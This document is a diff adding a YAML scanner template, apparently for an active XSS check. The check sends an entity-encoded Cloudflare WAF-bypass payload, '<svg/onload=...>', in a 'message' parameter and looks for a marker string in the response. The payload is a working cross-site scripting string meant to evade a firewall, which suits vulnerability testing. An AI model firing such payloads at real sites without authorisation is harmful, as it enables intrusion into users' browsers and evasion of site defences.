@@ -1,0 +1,20 @@
+id: patt-xss-cf-05-message
+name: 'PATT xss patt-xss-cf-05 via message'
+severity: high
+type: active
+tags:
+  - xss
+  - patt
+  - wafcloudflare
+description: 'PATT Cloudflare 22 Mar 2019: entity-encode without semicolons. [patt:patt-xss-cf-05] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/3%20-%20XSS%20Common%20WAF%20Bypass.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      message:
+        - '<svg/onload=&#97&#108&#101&#114&#00116&#40&#41nxp0028'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nxp0028'
